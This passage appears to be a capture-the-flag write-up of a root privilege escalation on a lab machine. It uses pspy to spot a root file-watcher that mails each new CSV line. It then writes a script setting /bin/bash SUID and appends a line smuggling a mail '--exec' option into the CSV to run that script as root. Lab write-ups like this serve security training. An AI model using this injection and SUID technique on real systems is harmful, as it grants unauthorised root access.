HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
```

Maybe there's something to do with that, looking at things with pspy we can observe this:
```
2023/01/16 04:22:49 CMD: UID=0    PID=914    | /bin/bash /root/scripts/notify.sh
2023/01/16 04:22:49 CMD: UID=0    PID=913    | inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
2023/01/16 04:22:49 CMD: UID=0    PID=903    | /bin/bash /root/scripts/notify.sh
```

Looks like some tool that reacts to file changes, and it's running as root, probably good for us.
```bash
$ inotifywait -h|head -3
inotifywait 3.22.1.0
Wait for a particular event on a file or set of files.
Usage: inotifywait [ options ] file1 [ file2 ] [ file3 ] [ ... ]
```

As can be observed above in the pspy64 output, the next PID that spawed is a shell script called notify.sh, is this triggering emails? Let's try it out, it's suposed to react when the file changes, so let's add a line to it: 
```bash
$ cat << EOF >> leave_requests.csv
> bean.hill.meaaaermblblkblkblbk
> EOF
$ cat leave_requests.csv
bean.hill.meaaaermblblkblkblbk
```

and we see this happening in pspy
```
2023/01/16 04:43:15 CMD: UID=0    PID=3622   | mail -s Leave Request: bean.hill.meaaaermblblkblkblbk christine
2023/01/16 04:43:15 CMD: UID=0    PID=3623   | /usr/sbin/sendmail -oi -f root@awkward -t
2023/01/16 04:43:15 CMD: UID=0    PID=3624   | /usr/sbin/postdrop -r
2023/01/16 04:43:15 CMD: UID=0    PID=3625   | cleanup -z -t unix -u -c
2023/01/16 04:43:15 CMD: UID=0    PID=3632   | mail -s Leave Request: bean.hill.meaaaermblblkblkblbk christine
2023/01/16 04:43:15 CMD: UID=0    PID=3630   | trivial-rewrite -n rewrite -t unix -u -c
2023/01/16 04:43:15 CMD: UID=0    PID=3633   | /usr/sbin/sendmail -oi -f root@awkward -t
2023/01/16 04:43:15 CMD: UID=0    PID=3634   | local -t unix
2023/01/16 04:43:15 CMD: UID=0    PID=3635   | /usr/sbin/postdrop -r
2023/01/16 04:43:15 CMD: UID=0    PID=3636   | local -t unix
```

Let's try to use the mail GTFO to set bash to SUID, for that we'll start by dropping a SUID script in /tmp
```bash
$ cat << EOF > asd
> #!/bin/bash
> chmod +s /bin/bash
> EOF
$ cat asd
#!/bin/bash
chmod +s /bin/bash
$ mv asd asd.sh
$ cat asd.sh
#!/bin/bash
chmod +s /bin/bash
$ chmod +x asd.sh
$ ls -la asd.sh
-rwxr-xr-x 1 www-data www-data 31 Jan 16 05:12 asd.sh
```

And after playing a little bit, we could execute that script as root, set bash to SUID, and we're root
```bash
$ cd -
/var/www/private
echo 'asdf --exec=\!/tmp/asd.sh' >> leave_requests.csv
$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  7  2022 /bin/bash
$ bash -p
wc -c /root/root.txt
33 root.txt
```

